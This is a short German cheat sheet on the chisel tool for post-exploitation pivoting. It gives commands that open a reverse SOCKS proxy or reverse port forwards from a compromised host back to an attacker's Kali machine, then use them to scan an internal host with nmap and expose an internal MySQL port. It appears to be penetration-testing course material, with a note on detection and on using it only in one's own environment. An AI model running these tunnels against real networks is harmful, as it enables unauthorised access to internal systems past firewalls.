# chisel

**Kategorie:** Pivoting (TCP-Tunnel über HTTP/WebSocket)

Schneller TCP-Tunnel über **HTTP/WebSocket** – firewall-/proxy-freundlich, wenn nur ausgehendes HTTP(S) erlaubt ist. Ein einzelnes Go-Binary (Server + Client in einem), baut SOCKS-Proxys oder Port-Forwards, meist als **Reverse**-Verbindung.

```bash
# Server (Angreifer/Kali):
chisel server -p 8000 --reverse
# Client (Pivot):
chisel client <KALI>:8000 R:socks
```

## Wichtigste Optionen

| Element | Bedeutung |
|---------|-----------|
| `server -p <port> --reverse` | Server, erlaubt Reverse-Tunnel |
| `client <server:port> <remote>` | Client verbindet zum Server |
| `R:socks` | Reverse-**SOCKS**-Proxy auf dem Server |
| `R:<lport>:<host>:<rport>` | Reverse-Port-Forward |
| `<lport>:<host>:<rport>` | lokaler Forward (forward) |
| `--tls-*` / `https` | TLS-Transport |

## Beispiele

```bash
# Reverse-SOCKS -> proxychains:
chisel server -p 8000 --reverse            # Kali
./chisel client <KALI>:8000 R:socks        # Pivot  -> SOCKS auf Kali:1080
proxychains nmap -sT -Pn 192.168.20.50

# interner Dienst auf Kali-Port:
./chisel client <KALI>:8000 R:13306:192.168.20.50:3306
```

## Hinweis

Server-/Client-**Version identisch** halten; Binary zur Ziel-Arch (`chisel_linux_amd64`). Erkennbar an langlebigen WS/TLS-Outbound → Egress/Proxy-Monitoring. Nur eigene Umgebung.

## Verwendet in

post-exploitation-pivoting 06 (Chisel & Ligolo), 10.
